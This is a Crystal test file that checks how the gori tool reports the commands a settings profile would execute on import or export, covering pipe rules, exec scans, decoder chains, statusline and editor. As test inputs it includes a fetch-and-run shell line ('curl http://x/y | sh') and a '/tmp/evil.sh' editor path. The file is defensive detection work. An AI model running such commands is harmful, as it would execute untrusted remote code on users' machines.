require "../spec_helper"

# `Settings.command_rules` — what a PROFILE would run on the machine that imports it (#842).
#
# The unit under test is deliberately the same reader both doors use: `gori settings export`
# runs it over the document it is about to write, `gori settings import` over the document it
# is about to apply. An example here that passes for one of them passes for both.
private def rules_in(json : String, only : Array(String)? = nil) : Array(Gori::Settings::CommandEntry)
  Gori::Settings.command_entries(JSON.parse(json), only)
end

# `command_rules` leans on the section parsers, two of which fall back to THIS INSTALL'S
# current value when handed a node of the wrong shape. The examples that pin that behaviour
# have to populate the class properties, so every example restores them.
private def with_global_rules(&)
  rules = Gori::Settings.rewriter_rules
  scan = Gori::Settings.scan_rules
  chains = Gori::Settings.decoder_chains
  begin
    yield
  ensure
    Gori::Settings.rewriter_rules = rules
    Gori::Settings.scan_rules = scan
    Gori::Settings.decoder_chains = chains
  end
end

private def pipe_rule(replacement : String, enabled : Bool = true, name : String = "resign") : Gori::Settings::RewriterRule
  Gori::Settings::RewriterRule.new(1_i64, enabled, name, "response", "body",
    "secret", replacement, "pipe", "literal", "", "")
end

# A profile carrying one command-carrying rule in each of the three sections.
private MIXED_PROFILE = <<-JSON
  { "network": { "bind_port": 9191 },
    "rewriter": { "rules": [ { "id": 1, "enabled": true, "name": "r", "pattern": "a",
                               "replacement": "./r.sh", "op": "pipe" } ] },
    "scan_rules": [ { "id": "s1", "title": "s", "kind": "exec", "pattern": "./s.py" } ],
    "decoder": { "chains": [ { "name": "d", "spec": "exec:./d.sh" } ] } }
  JSON

describe Gori::Settings::RewriterRule do
  it "asks Store::RuleOp rather than comparing the label" do
    # The acceptance criterion: the determination goes through the enum that OWNS the trust
    # boundary, so a fourth command-carrying op is answered here for free.
    pipe_rule("./resign.sh").executes?.should be_true
    pipe_rule("./resign.sh").command.should eq("./resign.sh")
    pipe_rule("x").copy_with(op: "replace").executes?.should be_false
    pipe_rule("x").copy_with(op: "replace").command.should be_nil
    # from_label is total — an unrecognised label reads as `replace`, never raises.
    pipe_rule("x").copy_with(op: "not-an-op").executes?.should be_false
  end
end

describe Gori::Settings::ScanRule do
  it "asks the same question of a kind" do
    exec = Gori::Settings::ScanRule.new("r1", "leak", "", "response", "body", "exec", "./detect.py", "high", true)
    exec.executes?.should be_true
    exec.command.should eq("./detect.py")
    exec.copy_with(kind: "regex").executes?.should be_false
    exec.copy_with(kind: "regex").command.should be_nil
    # The class-level form, for a would-be rule that has no record yet.
    Gori::Settings::ScanRule.executes?("exec").should be_true
    Gori::Settings::ScanRule.executes?("string").should be_false
  end
end

describe "Settings.command_rules — a rewriter pipe rule" do
  it "reports the rule with the argv out of `replacement`" do
    found = rules_in(<<-JSON)
      { "rewriter": { "next_rule_id": 2, "rules": [
        { "id": 1, "enabled": true, "name": "resign", "target": "request", "part": "body",
          "pattern": "sig=", "replacement": "./resign.sh --key $TOKEN", "op": "pipe",
          "match_kind": "literal", "host": "", "body_file": "" } ] } }
      JSON
    found.size.should eq(1)
    found[0].section.should eq("rewriter")
    found[0].kind.should eq("pipe")
    found[0].name.should eq("resign")
    # VERBATIM, `$TOKEN` unexpanded: the operator has to read what the file says, and the
    # binding is resolved per argv element at apply time (`Rules#pipe_argv`), not here.
    found[0].command.should eq("./resign.sh --key $TOKEN")
    found[0].enabled.should be_true
  end

  it "leaves every other op alone" do
    found = rules_in(<<-JSON)
      { "rewriter": { "rules": [
        { "id": 1, "enabled": true, "pattern": "a", "replacement": "b", "op": "replace" },
        { "id": 2, "enabled": true, "pattern": "X-Foo", "replacement": "1", "op": "set_header" },
        { "id": 3, "enabled": true, "pattern": "a", "replacement": "HTTP/1.1 200 OK", "op": "short_circuit" } ] } }
      JSON
    found.should be_empty
  end

  it "carries a DISABLED pipe rule, marked" do
    # A disabled rule forks nothing, which is why `PeerNotices` ignores one. A profile is not
    # that: the argv is in the bytes either way, and `enabled` is one keystroke on the far side.
    found = rules_in(<<-JSON)
      { "rewriter": { "rules": [
        { "id": 1, "enabled": false, "name": "off", "pattern": "a", "replacement": "/bin/echo",
          "op": "pipe" } ] } }
      JSON
    found.size.should eq(1)
    found[0].enabled.should be_false
  end

  it "reads the op the way the IMPORT will read it, not the way the file spells it" do
    # `clamp_field` downcases, so `PIPE` becomes a live pipe rule on import — reporting it as
    # anything else would be a second description of the parse.
    rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"pattern":"a","replacement":"/bin/echo","op":"PIPE"}]}})).size.should eq(1)
    # An unrecognised op clamps to `replace`, which runs nothing.
    rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"pattern":"a","replacement":"/bin/echo","op":"nope"}]}})).should be_empty
  end

  it "does not report an entry the parse would DROP" do
    # No pattern: `parse_rewriter_rules` drops it, so it never reaches the settings and cannot
    # run. Reporting it would refuse an import over a rule that does not exist.
    rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"replacement":"/bin/echo","op":"pipe"}]}})).should be_empty
  end

  it "does not report a pipe rule with an EMPTY argv" do
    # `Rules.pipe_argv_error` refuses one and the rule overlay will not save one, so it can
    # never run. Counting it would make the import refusal fire over an entry that arms
    # nothing — and print `(no command)` as the thing to read before deciding.
    rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"pattern":"a","replacement":"","op":"pipe"}]}})).should be_empty
    # Same for a bare `exec:` step, which fails with "no command".
    rules_in(%({"decoder":{"chains":[{"name":"c","spec":"base64-decode > exec:"}]}})).should be_empty
  end

  it "reports a pre-upgrade `presets` block, which imports DISABLED" do
    found = rules_in(<<-JSON)
      { "rewriter": { "presets": [
        { "name": "legacy", "pattern": "a", "replacement": "/bin/echo", "op": "pipe" } ] } }
      JSON
    found.size.should eq(1)
    found[0].name.should eq("legacy")
    found[0].enabled.should be_false
  end

  it "does not report THIS INSTALL'S rules for a node of the wrong shape" do
    with_global_rules do
      Gori::Settings.rewriter_rules = [pipe_rule("/usr/local/bin/mine")]
      # `parse_rewriter_rules` answers a non-array with the current value. Handing it one would
      # report the operator's own hook as though the profile carried it — and refuse the import
      # over a rule already on their disk.
      rules_in(%({"rewriter":{"rules":"nonsense"}})).should be_empty
      rules_in(%({"rewriter":{"presets":42}})).should be_empty
      rules_in(%({"rewriter":[]})).should be_empty
      rules_in(%({"rewriter":{}})).should be_empty
    end
  end
end

describe "Settings.command_rules — an exec scan rule" do
  it "reports the rule with the argv out of `pattern`" do
    found = rules_in(<<-JSON)
      { "scan_rules": [
        { "id": "r1", "title": "leak detector", "side": "response", "region": "body",
          "kind": "exec", "pattern": "./detect.py --strict", "severity": "high", "enabled": true } ] }
      JSON
    found.size.should eq(1)
    found[0].section.should eq("scan_rules")
    found[0].kind.should eq("exec")
    found[0].name.should eq("leak detector")
    found[0].command.should eq("./detect.py --strict")
  end

  it "leaves string and regex rules alone" do
    rules_in(<<-JSON).should be_empty
      { "scan_rules": [
        { "id": "r1", "title": "t", "kind": "string", "pattern": "secret" },
        { "id": "r2", "title": "t", "kind": "regex", "pattern": "se.ret" } ] }
      JSON
  end

  it "does not report an entry the parse would DROP" do
    # No title: `parse_scan_rules` drops it.
    rules_in(%({"scan_rules":[{"id":"r1","kind":"exec","pattern":"./x"}]})).should be_empty
  end

  it "does not report THIS INSTALL'S rules for a node of the wrong shape" do
    with_global_rules do
      Gori::Settings.scan_rules = [
        Gori::Settings::ScanRule.new("mine", "mine", "", "response", "body", "exec", "/usr/local/bin/mine", "info", true),
      ]
      rules_in(%({"scan_rules":{}})).should be_empty
      rules_in(%({"scan_rules":"nope"})).should be_empty
    end
  end
end

describe "Settings.command_rules — a decoder chain" do
  it "reports one entry per `exec:` step, named by the chain that holds it" do
    found = rules_in(<<-JSON)
      { "decoder": { "chains": [
        { "name": "resign", "spec": "base64-decode > exec:./sign.sh > base64-encode" },
        { "name": "plain", "spec": "base64-decode > url-encode" } ] } }
      JSON
    found.size.should eq(1)
    found[0].section.should eq("decoder")
    found[0].kind.should eq("exec")
    found[0].name.should eq("resign")
    found[0].command.should eq("./sign.sh")
    # A saved chain has no enabled flag — it is callable by name the moment it lands.
    found[0].enabled.should be_true
  end

  it "reports both steps of a chain that execs twice" do
    rules_in(%({"decoder":{"chains":[{"name":"two","spec":"exec:./a | exec:./b"}]}})).size.should eq(2)
  end

  it "survives a chain spec carrying a byte that is not valid UTF-8" do
    # Crystal's JSON parser rejects a lone surrogate but passes a raw 0xff straight through, so
    # an otherwise-valid profile can put one in a spec — and the chain split is a PCRE2 regex,
    # which RAISES on it. Out of `gori settings import` (which rescues only `Gori::Error`) that
    # was a Crystal backtrace instead of the listing, and no gate at all.
    raw = String.build do |io|
      io << %({"decoder":{"chains":[{"name":"a","spec":")
      io.write_byte(0xff_u8)
      io << %( > exec:./x"}]}})
    end
    raw.valid_encoding?.should be_false
    found = Gori::Settings.command_entries(JSON.parse(raw))
    found.size.should eq(1)
    found[0].command.should eq("./x")
  end

  it "does not report THIS INSTALL'S chains for a node of the wrong shape" do
    with_global_rules do
      Gori::Settings.decoder_chains = [{"mine", "exec:/usr/local/bin/mine"}]
      rules_in(%({"decoder":{"chains":"nope"}})).should be_empty
      rules_in(%({"decoder":{}})).should be_empty
    end
  end
end

describe "Settings.command_rules — section selection" do
  it "finds all three when nothing narrows it, in COMMAND_SECTIONS order" do
    found = rules_in(MIXED_PROFILE)
    found.map(&.section).should eq(["rewriter", "scan_rules", "decoder"])
  end

  it "reports only the sections `only` selects" do
    # This is what keeps `--sections network` from being refused over a hook it will not write.
    rules_in(MIXED_PROFILE, ["network"]).should be_empty
    rules_in(MIXED_PROFILE, ["network", "scan_rules"]).map(&.section).should eq(["scan_rules"])
    rules_in(MIXED_PROFILE, [] of String).should be_empty
  end

  it "answers empty for a document that carries no command at all" do
    rules_in(%({"network":{"bind_port":9191},"theme":"goriday"})).should be_empty
    rules_in(%([])).should be_empty
    rules_in(%("nope")).should be_empty
  end
end

describe "Settings.command_entries — the two sections that are not rule tables" do
  it "reports statusline as the SHELL command on a timer that it is" do
    # The sharpest entry on the list, and the one the first cut of this feature missed:
    # `Tui::Statusline.run` spawns `/bin/sh -c <command>` — a FULL shell, not ProcessHook's
    # argv exec — every `interval` seconds, with no proxied traffic needed to trigger it.
    found = rules_in(%({"statusline":{"enabled":true,"command":"curl http://x/y | sh","interval":5}}))
    found.size.should eq(1)
    found[0].section.should eq("statusline")
    found[0].kind.should eq("sh -c")
    found[0].command.should eq("curl http://x/y | sh")
    found[0].enabled.should be_true
  end

  it "marks statusline disabled only when the profile SAYS so" do
    # `parse_statusline` reads an absent `enabled` as "keep the current value", so a
    # hand-written profile that omits it may well end up live on the receiving install — and
    # for a shell on a timer the honest default is not to promise the row is inert.
    rules_in(%({"statusline":{"enabled":false,"command":"./s.sh"}}))[0].enabled.should be_false
    rules_in(%({"statusline":{"command":"./s.sh"}}))[0].enabled.should be_true
  end

  it "reports an editor command, which runs on the next --edit" do
    found = rules_in(%({"editor":{"command":"/tmp/evil.sh","markdown":""}}))
    found.size.should eq(1)
    found[0].section.should eq("editor")
    found[0].kind.should eq("exec")
    found[0].command.should eq("/tmp/evil.sh")
  end

  it "says nothing about an EMPTY editor, which every profile carries" do
    # `serialize_editor` writes the section unconditionally, so an empty command is in every
    # profile ever exported. Reporting it would put a note on every export and the flag on
    # every import, which is how a loud line stops being read — and it names the receiving
    # operator's own $VISUAL/$EDITOR/vi, not the profile's.
    rules_in(%({"editor":{"command":"","markdown":""}})).should be_empty
    rules_in(%({"statusline":{"enabled":true,"command":""}})).should be_empty
  end
end

# The guard that would have caught `statusline` and `editor` being left out — the failure this
# whole issue is about, one level up: a value gori spawns exists, and the export contract does
# not know about it.
#
# Keyed on the SPAWN SITES rather than on the section list, because that is the direction the
# question actually runs: "gori runs a program here — where does the program come from, and can
# a profile set it?" A new `Process.run` anywhere in the tree fails this until someone answers
# it, and answering "from settings" forces the section into COMMAND_SECTIONS.
#
# Counts, not just filenames, so a SECOND spawn added to an already-classified file is caught
# too. Comment lines are skipped: `process_hook.cr`'s own doc block quotes the call it makes.
private SPAWN_SITES = {
  # settings-derived — every one of these sections MUST be in COMMAND_SECTIONS
  "src/gori/process_hook.cr"                          => {1, "rewriter/scan_rules/decoder"},
  "src/gori/cli/settings.cr"                          => {1, "editor"},
  "src/gori/tui/runner.cr"                            => {1, "editor"},
  "src/gori/tui/controllers/statusline_controller.cr" => {1, "statusline"},
  # NOT settings-derived: the program is discovered, hardcoded, or comes off the wire
  "src/gori/browser.cr"                  => {2, nil}, # a detected browser; certutil
  "src/gori/tui/runner/external_open.cr" => {1, nil}, # hardcoded open/xdg-open
  "src/gori/update.cr"                   => {3, nil}, # tar, and the release manifest's own step
  "src/gori/update/channel.cr"           => {1, nil}, # the platform package manager
}

describe "Settings::COMMAND_SECTIONS" do
  it "names only sections gori actually exports" do
    # A name here that SECTION_KEYS does not carry would be a dispatch arm no document can
    # reach, and the operator would never be told about the section it was meant to cover.
    (Gori::Settings::COMMAND_SECTIONS - Gori::Settings::SECTION_KEYS).should be_empty
  end

  it "covers every settings-derived process spawn in the tree" do
    SPAWN_SITES.each do |_, (_, sections)|
      next unless sections
      sections.split('/').each do |section|
        Gori::Settings::COMMAND_SECTIONS.should contain(section)
      end
    end
  end

  it "has a spawn-site table that still matches the tree" do
    # Fails on a NEW `Process.new`/`Process.run` anywhere under src/, and on one added to a
    # file already listed. The fix is to classify it above — and if it reads a setting, to put
    # that section in COMMAND_SECTIONS so both ends of a profile report it.
    root = File.expand_path(File.join(__DIR__, "..", ".."))
    actual = Hash(String, Int32).new(0)
    Dir.glob(File.join(root, "src", "**", "*.cr")).sort.each do |path|
      rel = path.sub("#{root}/", "")
      File.read_lines(path).each do |line|
        next if line.lstrip.starts_with?('#')
        actual[rel] += 1 if line.includes?("Process.new(") || line.includes?("Process.run(")
      end
    end
    expected = SPAWN_SITES.transform_values { |(count, _)| count }
    actual.should eq(expected)
  end
end
